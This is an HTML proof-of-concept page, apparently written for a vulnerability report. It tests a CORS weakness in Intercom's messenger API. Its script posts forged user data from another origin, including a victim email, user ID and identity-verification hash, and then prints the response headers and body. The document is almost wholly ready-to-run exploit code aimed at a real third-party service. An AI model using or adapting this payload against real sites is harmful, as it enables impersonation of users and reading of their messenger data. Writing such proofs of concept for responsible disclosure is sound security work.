<!doctype html>
<html>
  <body>
    <h3>CORS PoC â€” Intercom</h3>
    <pre id="out">running...</pre>
    <script>
      const out = txt => document.getElementById('out').textContent += txt + "\\n";
      fetch("https://api-iam.intercom.io/messenger/web/ping", {
        method: "POST",
        headers: {
          "Accept": "application/json",
          "Content-Type": "application/x-www-form-urlencoded"
        },
        body: new URLSearchParams({
          app_id: 'rfwdy059',
          v: '3',
          platform: 'web',
          installation_type: 'js-snippet',
          user_data: JSON.stringify({
            email: "victim@example.com",
            user_id: "18706074",
            user_hash: "aaa329ca8412777f4d24580655930117afc084b7051d0707ec97fe7477ab7880",
            anonymous_id: "b3b9f985-a11c-46d5-bdda-35aa69d205aa",
            name: "PoC"
          })
        })
      })
      .then(async res => {
        out("status: " + res.status);
        out("response headers:");
        for (const h of res.headers.entries()) out(h[0] + ": " + h[1]);
        out("body:");
        out(await res.text());
      })
      .catch(e => out("fetch error: " + e));
    </script>
  </body>
</html>
